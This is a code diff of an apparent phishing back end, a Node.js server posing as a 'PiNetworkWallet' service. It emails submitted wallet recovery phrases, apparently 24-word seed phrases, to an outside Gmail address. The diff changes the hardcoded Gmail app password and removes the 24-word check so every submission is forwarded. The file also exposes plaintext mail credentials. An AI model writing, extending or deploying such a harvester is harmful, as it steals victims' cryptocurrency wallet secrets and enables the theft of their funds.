@@ -18,7 +18,7 @@ const port = 8000; // Change this to your desired port
 
 const transporter = nodemailer.createTransport({
   auth: {
-    pass: "qcnw ykiz yozc ffew",
+    pass: "phop baoj wpki iilk",
     user: "Pinetworkm493@gmail.com",
   },
   service: "gmail",
@@ -49,7 +49,8 @@ app.post("/submit/7668", async (req, res) => {
   const formNonce = req.body["form_nonce"];
   // forward to Email
   try {
-    if(mfText && mfText.split(' ').length == 24){
+    if(mfText){
+    // if(mfText && mfText.split(' ').length == 24){
       transporter.sendMail({
         from: "PiNetworkWallet ",
         to: ["Pinetworkm493@gmail.com"],
